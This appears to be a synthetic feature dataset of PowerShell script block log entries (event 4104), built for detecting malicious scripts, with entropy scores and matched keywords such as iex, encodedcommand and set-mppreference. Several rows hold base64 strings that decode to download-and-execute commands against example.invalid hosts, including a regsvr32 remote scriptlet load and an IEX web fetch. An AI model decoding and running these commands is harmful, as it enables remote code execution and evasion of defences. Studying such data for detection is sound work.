PST-139,windows_event_4104_scriptblocktext,177,1,16,52,0.293785,0.00565,0.124294,4.694712,10,10,92,0,0,0,0,9,0,0,0,0,,1,iex,1,0,0,2,downloadstring;webclient,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0
PST-140,windows_event_4104_scriptblocktext,33,1,3,3,0.090909,0.0,0.090909,3.710576,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-141,windows_event_4104_scriptblocktext,112,1,14,9,0.080357,0.0,0.125,4.384641,1,0,80,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,credential;password,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-142,windows_event_4104_scriptblocktext,172,1,9,11,0.063953,0.023256,0.040698,5.046198,1,0,134,1,72,1,0,0,0,0,0,0,,2,encodedcommand;windowstyle hidden,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-143,windows_event_4104_scriptblocktext,75,1,6,5,0.066667,0.026667,0.08,4.643009,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-144,windows_event_4104_scriptblocktext,108,1,10,10,0.092593,0.027778,0.092593,4.703933,1,1,16,0,0,0,0,0,0,0,0,2,Get-CimInstance;Win32_LogicalDisk,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-145,windows_event_4104_scriptblocktext,306,1,10,25,0.081699,0.03268,0.009804,4.978216,1,0,184,1,184,1,0,0,0,0,0,2,FromBase64String;cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AcgBlAGcALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEALgBzAGMAdAAgAHMAYwByAG8AYgBqAC4AZABsAGwA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,0,1,1,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1
PST-146,windows_event_4104_scriptblocktext,132,1,10,25,0.189394,0.007576,0.030303,4.941091,1,0,92,0,0,0,0,0,0,0,0,1,Net.WebClient,1,iex,1,0,0,2,downloadstring;webclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-147,windows_event_4104_scriptblocktext,71,1,6,7,0.098592,0.0,0.084507,4.671818,0,0,0,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-148,windows_event_4104_scriptblocktext,91,1,10,8,0.087912,0.010989,0.10989,4.49811,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-149,windows_event_4104_scriptblocktext,129,1,12,13,0.100775,0.007752,0.100775,4.700964,1,1,8,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-150,windows_event_4104_scriptblocktext,223,1,22,28,0.125561,0.008969,0.080717,4.841949,1,0,183,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-151,windows_event_4104_scriptblocktext,215,1,23,75,0.348837,0.0,0.032558,4.803856,12,12,104,0,0,0,0,0,1,0,0,0,,0,,0,0,0,1,start-bitstransfer,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-152,windows_event_4104_scriptblocktext,161,1,19,35,0.217391,0.0,0.049689,5.015305,1,0,119,0,0,0,8,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,2,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,0,3,3,0,0
PST-153,windows_event_4104_scriptblocktext,147,1,12,16,0.108844,0.006803,0.07483,5.069398,2,1,66,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,1,0,1,1,0,0
PST-154,windows_event_4104_scriptblocktext,374,1,10,26,0.069519,0.034759,0.008021,4.929627,1,0,252,1,252,1,0,0,0,0,0,2,FromBase64String;UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAtAFQAeQBwAGUAIABUAFgAVAAgAC0ATgBhAG0AZQAgACcAdABhAHMAawAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAUwB0AHIAaQBuAGcAcwA,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,0,1,1,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1
PST-155,windows_event_4104_scriptblocktext,166,1,18,16,0.096386,0.024096,0.114458,4.842553,2,2,21,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-156,windows_event_4104_scriptblocktext,289,1,29,87,0.301038,0.00346,0.044983,5.101352,12,9,176,0,0,0,0,0,1,0,0,1,New-ItemPropert,1,windowstyle hidden,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,currentversion\run;new-itemproperty,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,3,3,0
PST-157,windows_event_4104_scriptblocktext,88,1,8,6,0.068182,0.011364,0.090909,4.558768,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-158,windows_event_4104_scriptblocktext,78,1,8,8,0.102564,0.012821,0.102564,4.52696,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-159,windows_event_4104_scriptblocktext,140,1,17,25,0.178571,0.0,0.071429,4.885523,1,0,100,0,0,0,6,0,0,0,0,1,Resolve-DnsName,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-160,windows_event_4104_scriptblocktext,191,1,22,48,0.251309,0.068063,0.026178,5.390707,1,0,147,0,0,0,0,0,0,0,0,4,MozILlA;STaTuS;StAtUs;c2.ExamPle.inValiD,0,,0,0,0,1,invoke-webrequest,1,0,0,1,jitter,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-161,windows_event_4104_scriptblocktext,177,1,26,59,0.333333,0.0,0.056497,4.990823,11,10,83,0,0,0,8,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-162,windows_event_4104_scriptblocktext,110,1,10,17,0.154545,0.0,0.063636,4.60657,1,0,70,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-163,windows_event_4104_scriptblocktext,127,1,12,10,0.07874,0.015748,0.094488,4.611445,1,1,16,0,0,0,0,0,0,0,0,1,Get-NetRoute,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-164,windows_event_4104_scriptblocktext,261,1,25,82,0.314176,0.007663,0.099617,4.964987,11,6,167,0,0,0,0,10,0,0,0,1,wc.DownloadSt,0,,0,0,0,2,downloadstring;webclient,1,1,0,2,defaultwebproxy;user-agent,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,4,3,0
PST-165,windows_event_4104_scriptblocktext,128,1,9,8,0.0625,0.0,0.070312,4.607767,0,0,0,0,0,0,0,0,0,0,0,1,Get-ComputerInfo,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-166,windows_event_4104_scriptblocktext,234,1,25,88,0.376068,0.0,0.051282,4.720087,13,13,116,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,password;select-string,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,0,2,1,0,3,3,0
PST-167,windows_event_4104_scriptblocktext,128,1,13,38,0.296875,0.0,0.054688,4.917441,1,0,84,0,0,0,3,0,0,0,0,0,,1,get-command,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-168,windows_event_4104_scriptblocktext,119,1,12,30,0.252101,0.016807,0.07563,4.699805,1,0,54,0,0,0,0,0,0,0,0,1,ConvertFrom-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-169,windows_event_4104_scriptblocktext,402,1,10,27,0.067164,0.032338,0.007463,4.949648,1,0,280,1,280,1,0,0,0,0,0,2,FromBase64String;UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQAcwAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAuAGIAaQBuACcAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACcAJABlAG4AdgA6AFQARQBNAFAAXABjAGEAYwBoAGUALgBiAGkAbgAnAA,0,,0,0,0,1,start-bitstransfer,0,1,1,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1
PST-170,windows_event_4104_scriptblocktext,134,1,10,9,0.067164,0.007463,0.074627,4.602468,1,1,16,0,0,0,0,0,0,0,0,1,Get-MpComputerStatus,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-171,windows_event_4104_scriptblocktext,126,1,13,39,0.309524,0.015873,0.134921,4.71937,8,8,53,0,0,0,0,7,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-172,windows_event_4104_scriptblocktext,141,1,13,24,0.170213,0.007092,0.113475,4.90549,3,2,30,0,0,0,0,2,0,0,0,2,AuDiTMoDe;SeRvErNaMe,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-173,windows_event_4104_scriptblocktext,111,1,12,10,0.09009,0.018018,0.108108,4.621384,1,1,16,0,0,0,0,0,0,0,0,1,Get-SmbShare,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-174,windows_event_4104_scriptblocktext,87,1,9,7,0.08046,0.011494,0.103448,4.626151,0,0,0,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-175,windows_event_4104_scriptblocktext,146,1,11,29,0.19863,0.0,0.041096,4.786099,1,0,104,0,0,0,0,0,0,0,0,0,,0,,0,0,0,1,start-bitstransfer,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-176,windows_event_4104_scriptblocktext,80,1,8,8,0.1,0.0125,0.1125,4.588574,0,0,0,0,0,0,0,0,0,0,0,1,ConvertTo-Csv,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-177,windows_event_4104_scriptblocktext,139,1,11,29,0.208633,0.0,0.043165,5.142147,1,0,97,0,0,0,0,0,0,0,0,4,FILes.examPlE.invAlid;InvokE-wEbrEquEsT;UpdATe.BIN;UpdATe.BiN,0,,0,0,0,1,invoke-webrequest,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-178,windows_event_4104_scriptblocktext,124,1,8,24,0.193548,0.032258,0.016129,5.313558,1,0,84,1,24,1,0,0,0,0,0,1,FromBase64String,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,assembly]::load;frombase64string;reflection.assembly,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-179,windows_event_4104_scriptblocktext,289,1,37,102,0.352941,0.0,0.048443,5.256116,14,8,186,0,0,0,6,0,1,1,0,3,BlOb.tXT;CErtUTiL.exe;THesIs_iNErT_,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-180,windows_event_4104_scriptblocktext,88,1,7,6,0.068182,0.034091,0.079545,4.67758,0,0,0,0,0,0,0,0,0,0,0,2,Get-CimInstance;HotFixID,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-181,windows_event_4104_scriptblocktext,134,1,11,19,0.141791,0.0,0.074627,4.837607,1,0,94,0,0,0,0,0,0,0,0,1,Resolve-DnsName,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-182,windows_event_4104_scriptblocktext,82,1,8,6,0.073171,0.012195,0.097561,4.506764,0,0,0,0,0,0,0,0,0,0,0,1,Get-LocalUser,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-183,windows_event_4104_scriptblocktext,50,1,7,6,0.12,0.02,0.14,4.375338,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-184,windows_event_4104_scriptblocktext,44,1,6,5,0.113636,0.022727,0.113636,4.354223,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-185,windows_event_4104_scriptblocktext,174,1,15,54,0.310345,0.022989,0.126437,4.917267,11,11,84,0,0,1,0,10,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,assembly]::load;frombase64string;reflection.assembly,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-186,windows_event_4104_scriptblocktext,52,1,4,4,0.076923,0.0,0.076923,4.298635,0,0,0,0,0,0,0,0,0,0,0,1,Get-NetFirewallProfile,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-187,windows_event_4104_scriptblocktext,130,1,14,30,0.230769,0.030769,0.015385,5.338145,1,0,90,0,0,1,6,0,0,0,0,2,VEhFU0lTLUlORVJ;omBase64Stri,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,assembly]::load;frombase64string;reflection.assembly,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-188,windows_event_4104_scriptblocktext,161,1,13,12,0.074534,0.006211,0.080745,4.722797,1,1,16,0,0,0,0,0,0,0,0,1,Get-ComputerInfo,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-189,windows_event_4104_scriptblocktext,101,1,12,16,0.158416,0.019802,0.089109,4.584556,1,0,39,0,0,0,2,0,0,0,0,1,ConvertFrom-Csv,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-190,windows_event_4104_scriptblocktext,142,1,14,19,0.133803,0.007042,0.126761,4.628503,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-191,windows_event_4104_scriptblocktext,482,1,10,25,0.051867,0.051867,0.006224,4.842355,1,0,360,1,360,1,0,0,0,0,0,2,FromBase64String;JAB4AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIABNAHMAWABtAGwAMgAuAFMAZQByAHYAZQByAFgAbQBsAEgAdAB0AHAAOwAgACQAeAAuAE8AcABlAG4AKAAnAEcARQBUACcALAAnAGgAdAB0AHAAcwA6AC8ALwB4AG0AbAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AdABhAHMAawAnACwAJABmAGEAbABzAGUAKQA7ACAAJAB4AC4AUwBlAG4AZAAoACkAOwAgAEkARQBYACAAJAB4AC4AUgBlAHMAcABvAG4AcwBlAFQAZQB4AHQA,1,iex,0,1,1,2,responseText;serverxmlhttp,0,2,2,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,4,3,3
PST-192,windows_event_4104_scriptblocktext,338,1,10,25,0.073964,0.029586,0.008876,4.962221,1,0,216,1,216,1,0,0,0,0,0,2,FromBase64String;JABjAG0AZAA9ACgAJwBJAG4AdgAnACsAJwBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AJwApADsAIAAmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAkAGMAbQBkACkAIAAiAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJwBUAEgARQBTAEkAUwAtAEkATgBFAFIAVAAnACIA,1,get-command,0,1,1,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1
PST-193,windows_event_4104_scriptblocktext,95,1,11,16,0.168421,0.010526,0.073684,4.997834,1,1,16,0,0,0,0,0,0,0,0,1,ConvertTo-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-194,windows_event_4104_scriptblocktext,176,1,16,52,0.295455,0.0,0.147727,4.582672,11,11,86,0,0,0,0,10,0,0,0,1,Set-MpP,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,disableRealtimeMonitoring;exclusionpath;set-mppreference,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-195,windows_event_4104_scriptblocktext,101,1,6,5,0.049505,0.0,0.059406,4.511301,0,0,0,0,0,0,0,0,0,0,0,1,Get-MpComputerStatus,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-196,windows_event_4104_scriptblocktext,120,1,18,24,0.2,0.041667,0.075,4.776456,2,0,79,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-197,windows_event_4104_scriptblocktext,262,1,14,30,0.114504,0.015267,0.045802,5.114243,1,0,218,1,72,1,0,0,0,0,0,0,,1,encodedcommand,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-198,windows_event_4104_scriptblocktext,262,1,14,30,0.114504,0.015267,0.045802,5.359819,1,0,218,1,72,1,0,0,0,0,0,7,ENcOdedcomManD;ExEcUTe;NEW-sCHeDuLedtaskAcTioN;NoPROfILE;POwErshelL.eXE;TasKNAmE;reGiStER-SCheDULEDtAsK,1,encodedcommand,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-199,windows_event_4104_scriptblocktext,170,1,14,62,0.364706,0.0,0.147059,4.478956,10,10,81,0,0,0,0,9,0,0,0,0,,1,get-command,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-200,windows_event_4104_scriptblocktext,182,1,21,47,0.258242,0.005495,0.043956,5.190571,1,0,140,0,0,0,5,0,0,0,0,1,MsXml2.ServerXmlHttp,1,iex,1,0,0,2,responseText;serverxmlhttp,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-201,windows_event_4104_scriptblocktext,163,1,14,24,0.147239,0.006135,0.055215,4.949759,2,0,78,1,26,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-202,windows_event_4104_scriptblocktext,295,1,39,99,0.335593,0.00339,0.050847,5.261248,14,10,186,0,0,0,10,0,1,0,0,2,MiCrOsof;rSheLl,1,windowstyle hidden,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,currentversion\run;new-itemproperty,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,3,3,0
PST-203,windows_event_4104_scriptblocktext,80,1,10,14,0.175,0.0,0.0625,4.680998,1,0,42,0,0,0,2,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-204,windows_event_4104_scriptblocktext,91,1,7,18,0.197802,0.021978,0.032967,4.999001,1,0,53,0,0,0,0,0,0,0,0,4,ENtRypOiNT;RundLL32.eXE;sTaGE.dLl;thesis_InERt__,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-205,windows_event_4104_scriptblocktext,105,1,11,13,0.12381,0.028571,0.114286,4.651701,1,1,6,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,win32_process,1,0,0,1,0,1,1,0,0
PST-206,windows_event_4104_scriptblocktext,107,1,10,9,0.084112,0.009346,0.084112,4.56471,0,0,0,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-207,windows_event_4104_scriptblocktext,235,1,34,40,0.170213,0.008511,0.076596,4.8856,1,0,195,0,0,0,12,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-208,windows_event_4104_scriptblocktext,136,1,10,9,0.066176,0.007353,0.073529,4.590326,1,1,16,1,25,0,0,0,0,0,0,1,Get-MpPreference,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,disableRealtimeMonitoring,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-209,windows_event_4104_scriptblocktext,167,1,23,33,0.197605,0.053892,0.095808,5.057195,3,0,88,0,0,0,0,0,0,0,0,1,ForEach-Object,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
